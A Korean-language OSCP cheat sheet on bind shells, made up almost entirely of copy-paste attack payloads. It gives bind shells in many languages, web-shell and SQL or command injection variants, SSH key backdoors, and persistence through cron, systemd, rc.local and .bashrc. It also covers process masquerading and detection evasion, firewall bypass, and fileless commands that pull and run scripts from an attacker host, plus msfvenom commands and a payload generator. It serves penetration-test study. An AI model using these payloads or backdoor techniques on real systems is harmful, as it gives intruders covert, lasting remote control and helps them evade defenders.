# Bind Shells - OSCP 공격 가이드

> **목표: 타겟 시스템에서 포트를 열어 공격자가 연결할 수 있는 백도어 생성**

## ⚡ 기본 페이로드들 (즉시 복사-붙여넣기)

### 🔌 연결 방법 (공격자 머신)

```bash
# 기본 Netcat 연결
nc {TARGET_IP} 4444
nc -v {TARGET_IP} 4444

# Telnet 연결
telnet {TARGET_IP} 4444

# OpenSSL 암호화 연결
openssl s_client -connect {TARGET_IP}:4444 -quiet

# Socat 연결
socat - tcp:{TARGET_IP}:4444
socat - openssl-connect:{TARGET_IP}:4444,verify=0

# SSH 터널을 통한 연결
ssh -L 4444:localhost:4444 user@{TARGET_IP}
ssh -D 9050 user@{TARGET_IP}  # SOCKS 프록시

# 다중 세션 연결 테스트
for i in {1..5}; do nc {TARGET_IP} 4444 & done
```

### 🐧 리눅스 Bind Shell

```bash
# Netcat 기본 (포트 4444)
nc -lvnp 4444 -e /bin/bash
nc -lvnp 4444 -c /bin/bash

# Netcat without -e flag
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp 4444 >/tmp/f

# 다중 연결 허용 Netcat
while true; do nc -lvnp 4444 -e /bin/bash; done

# Socat Bind Shell
socat tcp-listen:4444,reuseaddr,fork exec:/bin/bash,pty,stderr,setpgid,sigint,sane

# Python Bind Shell
python -c "
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(('0.0.0.0',4444))
s.listen(1)
conn,addr=s.accept()
os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)
os.dup2(conn.fileno(),2)
subprocess.call(['/bin/bash','-i'])
"

# Python3 Bind Shell
python3 -c "
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(('0.0.0.0',4444))
s.listen(1)
conn,addr=s.accept()
os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)
os.dup2(conn.fileno(),2)
subprocess.call(['/bin/bash','-i'])
"

# Perl Bind Shell
perl -e '
use Socket;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
bind(S,sockaddr_in(4444,INADDR_ANY));
listen(S,3);
accept(C,S);
open(STDIN,">&C");
open(STDOUT,">&C");
open(STDERR,">&C");
exec("/bin/bash -i");
'

# Ruby Bind Shell
ruby -rsocket -e '
s=TCPServer.new(4444)
c=s.accept
$stdin.reopen(c)
$stdout.reopen(c)
$stderr.reopen(c)
$stdin.each_line{|l|l=l.strip;next if l.length==0;(IO.popen(l,"rb"){|fd| fd.each_line {|o| c.puts(o.strip) }}) rescue nil }
'

# Node.js Bind Shell
node -e "
require('net').createServer(function(s){
    s.on('data',function(d){
        require('child_process').exec(d.toString(),function(e,r,x){
            s.write(r)
        })
    })
}).listen(4444)
"

# PHP Bind Shell
php -r '
$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
socket_bind($s,"0.0.0.0",4444);
socket_listen($s,1);
$c=socket_accept($s);
while(1){
    $i=socket_read($c,1024);
    $o=shell_exec($i);
    socket_write($c,$o,strlen($o));
}
'
```

### 🪟 윈도우 Bind Shell

```powershell
# PowerShell TCP Bind Shell
powershell -nop -c "
$l=New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444);
$l.Start();
$c=$l.AcceptTcpClient();
$s=$c.GetStream();
[byte[]]$b=0..65535|%{0};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
    $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
    $sb=(iex $d 2>&1|Out-String);
    $sb2=$sb+'PS '+(pwd).Path+'> ';
    $sb=[System.Text.Encoding]::ASCII.GetBytes($sb2);
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
}
$c.Close();
$l.Stop()
"

# CMD Netcat Bind Shell
nc.exe -lvnp 4444 -e cmd.exe

# Python Windows Bind Shell
python.exe -c "
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(('0.0.0.0',4444))
s.listen(1)
conn,addr=s.accept()
os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)
os.dup2(conn.fileno(),2)
subprocess.call(['cmd.exe'])
"

# VBScript Bind Shell
echo "
Set WshShell = CreateObject(""WScript.Shell"")
Set Socket = CreateObject(""MSWinsock.Winsock"")
Socket.LocalPort = 4444
Socket.Listen
Do While Socket.State <> 7
    DoEvents
Loop
Set Client = Socket.Accept
Do
    Command = Client.GetData
    If Len(Command) > 0 Then
        Result = WshShell.Exec(Command).StdOut.ReadAll
        Client.SendData Result
    End If
Loop
" > bind.vbs && cscript bind.vbs

# C# Bind Shell
powershell -nop -c "
Add-Type -TypeDefinition '
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
public class BindShell {
    public static void Main() {
        TcpListener l = new TcpListener(IPAddress.Any, 4444);
        l.Start();
        TcpClient c = l.AcceptTcpClient();
        NetworkStream s = c.GetStream();
        byte[] b = new byte[1024];
        while(true) {
            int i = s.Read(b, 0, b.Length);
            string cmd = Encoding.ASCII.GetString(b, 0, i).Trim();
            Process p = new Process();
            p.StartInfo.FileName = \"cmd.exe\";
            p.StartInfo.Arguments = \"/c \" + cmd;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.Start();
            string o = p.StandardOutput.ReadToEnd();
            byte[] ob = Encoding.ASCII.GetBytes(o);
            s.Write(ob, 0, ob.Length);
        }
    }
}';
[BindShell]::Main()
"
```

## 🎯 상황별 페이로드

### 🌐 웹쉘을 통한 Bind Shell

```php
# PHP 웹쉘에서 Bind Shell 생성
<?php
if($_GET['action'] == 'bind') {
    $cmd = "nc -lvnp 4444 -e /bin/bash > /dev/null 2>&1 &";
    shell_exec($cmd);
    echo "Bind shell started on port 4444";
}
?>

# PHP 백그라운드 Bind Shell
<?php
$cmd = "nohup nc -lvnp 4444 -e /bin/bash > /dev/null 2>&1 &";
shell_exec($cmd);
echo "Background bind shell active";
?>

# PHP Socat Bind Shell
<?php
$cmd = "socat tcp-listen:4444,reuseaddr,fork exec:/bin/bash,pty,stderr,setpgid,sigint,sane &";
shell_exec($cmd);
echo "Socat bind shell started";
?>

# ASP.NET Bind Shell
<%
System.Diagnostics.Process.Start("cmd.exe", "/c nc.exe -lvnp 4444 -e cmd.exe");
Response.Write("Bind shell started");
%>

# JSP Bind Shell
<%
Runtime.getRuntime().exec("nc -lvnp 4444 -e /bin/bash");
out.println("Bind shell active");
%>
```

### 💉 SQL Injection을 통한 Bind Shell

```sql
# MSSQL xp_cmdshell Bind Shell
'; EXEC xp_cmdshell 'powershell -nop -c "$l=New-Object System.Net.Sockets.TcpListener(''0.0.0.0'',4444);$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+''PS ''+(pwd).Path+''> '';$sb=[System.Text.Encoding]::ASCII.GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()}$c.Close();$l.Stop()"'; --

# MySQL sys_exec Bind Shell (UDF 필요)
'; SELECT sys_exec('nc -lvnp 4444 -e /bin/bash &'); --

# PostgreSQL COPY TO PROGRAM
'; COPY (SELECT 'nc -lvnp 4444 -e /bin/bash &') TO PROGRAM 'bash'; --

# Oracle Java 저장 프로시저 (권한 필요)
BEGIN
    DBMS_JAVA.grant_permission('SCOTT', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute');
    DBMS_JAVA.grant_permission('SCOTT', 'SYS:java.net.SocketPermission', '*:4444', 'listen,resolve');
END;
/
```

### 🔧 Command Injection을 통한 Bind Shell

```bash
# 백그라운드 Bind Shell (연결 유지)
; nc -lvnp 4444 -e /bin/bash &
; nohup nc -lvnp 4444 -e /bin/bash > /dev/null 2>&1 &

# Python Bind Shell (백그라운드)
; python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('0.0.0.0',4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(['/bin/bash','-i'])" &

# 다중 포트 Bind Shell
; for port in 4444 4445 4446; do nc -lvnp $port -e /bin/bash & done

# Windows PowerShell Bind Shell
& powershell -nop -w hidden -c "$l=New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444);$l.Start();while($true){$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb=[System.Text.Encoding]::ASCII.GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()}$c.Close()}"
```

### 🔐 SSH를 통한 Bind Shell (백도어)

```bash
# SSH 키 기반 백도어 (권한 있을 때)
# 1. SSH 키 생성
ssh-keygen -t rsa -f /tmp/backdoor -N ""

# 2. 공개키를 authorized_keys에 추가
cat /tmp/backdoor.pub >> ~/.ssh/authorized_keys
cat /tmp/backdoor.pub >> /root/.ssh/authorized_keys

# 3. 개인키 다운로드
cat /tmp/backdoor

# SSH 터널을 통한 Bind Shell
ssh -R 4444:localhost:22 user@{ATTACKER_IP}

# SSH를 통한 포트 포워딩 백도어
ssh -L 0.0.0.0:4444:localhost:22 -N -f user@localhost
```

## 🔄 우회 기법들

### 🚪 포트 우회 전략

```bash
# 일반적으로 열려있는 포트들 사용
80     # HTTP
443    # HTTPS
53     # DNS
22     # SSH
21     # FTP
25     # SMTP
110    # POP3
143    # IMAP
993    # IMAPS
995    # POP3S
3389   # RDP
5432   # PostgreSQL
3306   # MySQL

# 포트 스캔 후 사용 가능한 포트 확인
nmap -p- localhost | grep closed | head -5

# 여러 포트에 동시 바인딩
for port in 80 443 53 8080 8443; do
    nc -lvnp $port -e /bin/bash &
done

# 랜덤 포트 사용
port=$((RANDOM % 65535 + 1024))
nc -lvnp $port -e /bin/bash &
echo "Bind shell on port: $port"

# Windows에서 사용 가능한 포트 확인
netstat -an | findstr LISTENING
```

### 🔐 암호화 Bind Shell

```bash
# OpenSSL 암호화 Bind Shell (공격자가 인증서 가져와야 함)
# 1. 인증서 생성
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# 2. 암호화된 Bind Shell
socat openssl-listen:4444,cert=cert.pem,key=key.pem,verify=0,fork exec:/bin/bash,pty,stderr,setpgid,sigint,sane

# 3. 공격자 연결
socat - openssl-connect:{TARGET_IP}:4444,verify=0

# SSH 터널을 통한 암호화
ssh -L 4444:localhost:4444 user@{TARGET_IP}

# Stunnel을 이용한 SSL 래핑
echo "
[bind]
accept = 4444
connect = 4445
cert = /tmp/cert.pem
" > /tmp/stunnel.conf
stunnel /tmp/stunnel.conf &
nc -lvnp 4445 -e /bin/bash
```

### 🎭 프로세스 은닉

```bash
# 프로세스명 변경
cp /bin/bash /tmp/systemd-update
/tmp/systemd-update -c "nc -lvnp 4444 -e /bin/bash" &

# 공백 문자를 이용한 은닉
cp /bin/nc "/tmp/                    "
"/tmp/                    " -lvnp 4444 -e /bin/bash &

# 정상 프로세스로 위장
cp /bin/nc /tmp/apache2
/tmp/apache2 -lvnp 80 -e /bin/bash &

# 환경 변수를 이용한 은닉
export EVIL_PORT=4444
nc -lvnp $EVIL_PORT -e /bin/bash &

# 메모리 내 실행 (파일리스)
bash -c "$(curl -s http://{ATTACKER_IP}/bind.sh)"
```

### 🌐 HTTP/HTTPS 터널링

```bash
# HTTP 기반 Bind Shell
# 타겟에서 HTTP 서버 시작
python3 -c "
import http.server
import socketserver
import subprocess
import threading

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        if post_data.startswith('CMD:'):
            cmd = post_data[4:]
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            response = result.stdout + result.stderr
        else:
            response = 'Invalid command'

        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(response.encode())

with socketserver.TCPServer(('', 8080), Handler) as httpd:
    httpd.serve_forever()
"

# 공격자에서 HTTP 클라이언트
while true; do
    echo -n "HTTP Shell> "
    read cmd
    curl -X POST -d "CMD:$cmd" http://{TARGET_IP}:8080/
done

# WebSocket 기반 Bind Shell
python3 -c "
import asyncio
import websockets
import subprocess

async def handle_client(websocket, path):
    async for message in websocket:
        result = subprocess.run(message, shell=True, capture_output=True, text=True)
        await websocket.send(result.stdout + result.stderr)

start_server = websockets.serve(handle_client, '0.0.0.0', 4444)
asyncio.get_event_loop().run_until_complete(start_server)
asyncio.get_event_loop().run_forever()
"
```

### 🔄 재연결 및 지속성

```bash
# 자동 재시작 Bind Shell
while true; do
    nc -lvnp 4444 -e /bin/bash
    sleep 5
done &

# Cron을 이용한 지속성
echo "*/5 * * * * nc -lvnp 4444 -e /bin/bash" | crontab -

# Systemd 서비스로 등록
cat > /etc/systemd/system/bind-shell.service << EOF
[Unit]
Description=System Bind Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/nc -lvnp 4444 -e /bin/bash
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl enable bind-shell.service
systemctl start bind-shell.service

# Init 스크립트 백도어
echo 'nc -lvnp 4444 -e /bin/bash &' >> /etc/rc.local

# Profile 스크립트 백도어
echo 'nc -lvnp 4444 -e /bin/bash &' >> ~/.bashrc
echo 'nc -lvnp 4444 -e /bin/bash &' >> /etc/profile
```

## 🤖 자동화 도구 명령어

### 🔫 MSFVenom Bind Shell 생성

```bash
# Linux ELF Bind Shell
msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f elf > bind_shell.elf
msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf > bind_shell64.elf

# Windows EXE Bind Shell
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe > bind_shell.exe
msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe > bind_shell64.exe

# Python Bind Shell 스크립트
msfvenom -p cmd/unix/bind_python LPORT=4444 -f raw > bind_python.py

# Perl Bind Shell 스크립트
msfvenom -p cmd/unix/bind_perl LPORT=4444 -f raw > bind_perl.pl

# PHP Bind Shell
msfvenom -p php/bind_php LPORT=4444 -f raw > bind_shell.php

# PowerShell Bind Shell
msfvenom -p cmd/windows/bind_powershell LPORT=4444 -f raw > bind_shell.ps1

# WAR 파일 (Tomcat)
msfvenom -p java/shell_bind_tcp LPORT=4444 -f war > bind_shell.war

# ASP Bind Shell
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f asp > bind_shell.asp

# ASPX Bind Shell
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f aspx > bind_shell.aspx

# Node.js Bind Shell
msfvenom -p nodejs/shell_bind_tcp LPORT=4444 -f raw > bind_shell.js
```

### 🔧 Metasploit 핸들러

```bash
# Metasploit Bind Shell 핸들러
use exploit/multi/handler
set payload linux/x86/shell_bind_tcp
set RHOST {TARGET_IP}
set LPORT 4444
run

# Windows Bind Shell 핸들러
use exploit/multi/handler
set payload windows/shell_bind_tcp
set RHOST {TARGET_IP}
set LPORT 4444
run

# 다중 세션 핸들러
use exploit/multi/handler
set payload generic/shell_bind_tcp
set RHOST {TARGET_IP}
set LPORT 4444
set ExitOnSession false
exploit -j
```

### 🐍 자동화 Bind Shell 생성기

```python
#!/usr/bin/env python3
import sys
import base64

def generate_bind_shells(port):
    shells = {
        "bash": f"nc -lvnp {port} -e /bin/bash",
        "socat": f"socat tcp-listen:{port},reuseaddr,fork exec:/bin/bash,pty,stderr,setpgid,sigint,sane",
        "python": f"""python -c "
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(('0.0.0.0',{port}))
s.listen(1)
conn,addr=s.accept()
os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)
os.dup2(conn.fileno(),2)
subprocess.call(['/bin/bash','-i'])
\"""",
        "powershell": f"""powershell -nop -c "$l=New-Object System.Net.Sockets.TcpListener('0.0.0.0',{port});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb=[System.Text.Encoding]::ASCII.GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()}}$c.Close();$l.Stop()\""""
    }

    print(f"[+] Bind Shell payloads for port {port}:")
    print("="*60)

    for name, payload in shells.items():
        print(f"\n[{name.upper()}]")
        print(payload)

        # Base64 인코딩 버전도 제공
        if name == "bash":
            encoded = base64.b64encode(payload.encode()).decode()
            print(f"\n[{name.upper()} - BASE64]")
            print(f"echo '{encoded}' | base64 -d | bash")

    print(f"\n[+] Connect with: nc {sys.argv[2] if len(sys.argv) > 2 else '{TARGET_IP}'} {port}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 bind_gen.py <PORT> [TARGET_IP]")
        sys.exit(1)

    port = sys.argv[1]
    generate_bind_shells(port)
```

### 🔍 포트 스캐너 & 바인더

```bash
#!/bin/bash
# 자동 포트 스캔 및 Bind Shell 생성

TARGET_IP="$1"
START_PORT="$2"
END_PORT="$3"

if [ $# -ne 3 ]; then
    echo "Usage: $0 <TARGET_IP> <START_PORT> <END_PORT>"
    exit 1
fi

echo "[+] Scanning for available ports on $TARGET_IP..."

for port in $(seq $START_PORT $END_PORT); do
    timeout 1 bash -c "echo >/dev/tcp/$TARGET_IP/$port" 2>/dev/null
    if [ $? -ne 0 ]; then
        echo "[+] Port $port appears available"

        # Bind Shell 생성 시도
        echo "[+] Attempting to create bind shell on port $port"

        # 다양한 방법으로 시도
        PAYLOADS=(
            "nc -lvnp $port -e /bin/bash &"
            "socat tcp-listen:$port,reuseaddr,fork exec:/bin/bash,pty,stderr,setpgid,sigint,sane &"
            "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('0.0.0.0',$port));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(['/bin/bash','-i'])\" &"
        )

        for payload in "${PAYLOADS[@]}"; do
            echo "[+] Trying: $payload"
            # 실제 실행은 원격 시스템에서 해야 함
        done

        break
    fi
done
```

## 🚨 문제 해결

### ❌ 포트에 연결할 수 없을 때

```bash
# 1. 포트 확인
netstat -ln | grep :4444
ss -ln | grep :4444

# 2. 방화벽 규칙 확인
iptables -L | grep 4444
ufw status | grep 4444

# 3. 프로세스 확인
ps aux | grep nc
ps aux | grep 4444

# 4. 다른 포트 시도
for port in 80 443 53 22 21 25 110 143 993 995; do
    echo "[+] Trying port $port"
    nc -lvnp $port -e /bin/bash &
    sleep 2
    nc -v localhost $port && break
done

# 5. 로컬 접근 테스트
nc localhost 4444
telnet localhost 4444

# 6. 네트워크 인터페이스 확인
netstat -i
ip addr show
```

### 🔥 방화벽 우회

```bash
# 1. 일반적으로 허용되는 포트 사용
nc -lvnp 80 -e /bin/bash &    # HTTP
nc -lvnp 443 -e /bin/bash &   # HTTPS
nc -lvnp 53 -e /bin/bash &    # DNS

# 2. 기존 서비스 포트 활용
# 웹 서버가 실행 중이면 다른 포트로 이동
sudo netstat -tlnp | grep :80
sudo kill $(sudo lsof -t -i:80)
nc -lvnp 80 -e /bin/bash &

# 3. iptables 규칙 추가 (권한 있을 때)
iptables -I INPUT -p tcp --dport 4444 -j ACCEPT
iptables -I OUTPUT -p tcp --sport 4444 -j ACCEPT

# 4. SSH 터널을 통한 우회
ssh -R 4444:localhost:22 user@{ATTACKER_IP}

# 5. HTTP 터널링
# 웹 서버를 통한 쉘 터널링 (앞에서 설명한 HTTP 방법 사용)

# 6. IPv6 사용 (방화벽이 IPv4만 막는 경우)
nc -6 -lvnp 4444 -e /bin/bash &
```

### 🚫 바이너리가 없을 때

```bash
# 1. Netcat이 없을 때
# Socat 사용
socat tcp-listen:4444,reuseaddr,fork exec:/bin/bash,pty,stderr,setpgid,sigint,sane

# Bash만으로 Bind Shell
bash -c "
while true; do
    { echo -e 'HTTP/1.1 200 OK\r\n\r'; bash -i; } | nc -l 4444
done
" &

# 2. Python/Perl/Ruby 스크립트 사용
# (앞에서 제공한 스크립트들 활용)

# 3. 컴파일된 바이너리 업로드
# 공격자 머신에서 정적 컴파일
gcc -static -o bind_shell bind_shell.c
# 타겟으로 전송 후 실행

# 4. 웹 다운로드
wget http://{ATTACKER_IP}/nc -O /tmp/nc
chmod +x /tmp/nc
/tmp/nc -lvnp 4444 -e /bin/bash

# 5. 바이너리 임베딩 (Base64)
echo "H4sICAAAAAACA..." | base64 -d | gunzip > /tmp/nc
chmod +x /tmp/nc
```

### 🔌 연결이 불안정할 때

```bash
# 1. 재연결 루프
while true; do
    nc -lvnp 4444 -e /bin/bash
    echo "[+] Connection lost, restarting..."
    sleep 5
done &

# 2. 다중 포트 바인딩
for port in 4444 4445 4446 4447; do
    nc -lvnp $port -e /bin/bash &
done

# 3. Socat 사용 (더 안정적)
socat tcp-listen:4444,reuseaddr,fork exec:/bin/bash,pty,stderr,setpgid,sigint,sane

# 4. 서비스로 등록
cat > /etc/systemd/system/bind-shell.service << EOF
[Unit]
Description=Bind Shell Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do nc -lvnp 4444 -e /bin/bash; sleep 5; done'
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl enable bind-shell.service
systemctl start bind-shell.service

# 5. Cron을 이용한 정기 재시작
echo "*/10 * * * * pkill -f 'nc.*4444' && nc -lvnp 4444 -e /bin/bash &" | crontab -
```

### 🎭 탐지 회피

```bash
# 1. 프로세스명 변경
cp /bin/bash /tmp/systemd-journal
cp /bin/nc /tmp/systemd-update
/tmp/systemd-update -lvnp 4444 -e /tmp/systemd-journal &

# 2. 비표준 포트 사용
port=$((RANDOM % 30000 + 30000))  # 30000-60000 범위
nc -lvnp $port -e /bin/bash &

# 3. 암호화 사용
socat openssl-listen:4444,cert=cert.pem,key=key.pem,verify=0,fork exec:/bin/bash,pty,stderr,setpgid,sigint,sane

# 4. 기존 서비스로 위장
sudo netstat -tlnp | grep :22
nc -lvnp 22 -e /bin/bash &  # SSH 포트 사용

# 5. 파일리스 실행
curl -s http://{ATTACKER_IP}/bind.sh | bash

# 6. 메모리 내 실행
exec 3<>/dev/tcp/{ATTACKER_IP}/8080
echo "GET /bind.sh HTTP/1.1
Host: {ATTACKER_IP}

" >&3
bash <&3
```

## 📊 성공 판정 기준

### ✅ Bind Shell 생성 성공

- **포트 리스닝**: `netstat -ln | grep :4444` 또는 `ss -ln | grep :4444` 확인
- **프로세스 실행**: `ps aux | grep nc` 또는 해당 프로세스 확인
- **외부 연결 가능**: 공격자 머신에서 `nc {TARGET_IP} 4444` 연결 성공
- **쉘 응답**: `whoami`, `id`, `pwd` 등 명령어 정상 실행

### ✅ 지속성 확보

- **재부팅 후 생존**: 시스템 재부팅 후에도 자동으로 Bind Shell 실행
- **서비스 등록**: systemd, init 스크립트로 서비스 등록 완료
- **Cron 작업**: crontab으로 정기적 재실행 설정
- **다중 백도어**: 여러 포트, 여러 방법으로 접근 경로 확보

### ✅ 보안 우회

- **방화벽 우회**: 허용된 포트를 통한 연결 성공
- **탐지 회피**: 정상 프로세스로 위장, 암호화 연결
- **권한 유지**: 높은 권한으로 Bind Shell 실행
- **네트워크 제한 우회**: HTTP 터널링, SSH 터널 등으로 연결

### ⏰ 시간 관리

- **즉시 설정**: 시스템 접근 후 5분 이내 Bind Shell 설정
- **지속성 확보**: 10분 이내 재부팅 대비 지속성 메커니즘 구축
- **다중 백도어**: 15분 이내 여러 접근 방법 확보
- **테스트 완료**: 20분 이내 모든 백도어 정상 동작 확인

**활용 전략**: Reverse Shell + Bind Shell 조합으로 이중 안전장치 구축

## 💡 OSCP 실전 팁

- **Reverse Shell 보완**: Outbound 차단시 Bind Shell로 대체
- **지속성 최우선**: 시험 중 연결 끊어져도 재접근 가능하도록
- **다중 포트**: 여러 포트에 동시 바인딩으로 안정성 확보
- **암호화 사용**: 네트워크 모니터링 환경에서 탐지 회피
- **서비스 등록**: 높은 권한 획득시 시스템 서비스로 등록
- **정상 포트 활용**: 80, 443, 22 등 일반적 포트로 의심 회피
- **백업 계획**: Primary access 실패시 Secondary access로 전환
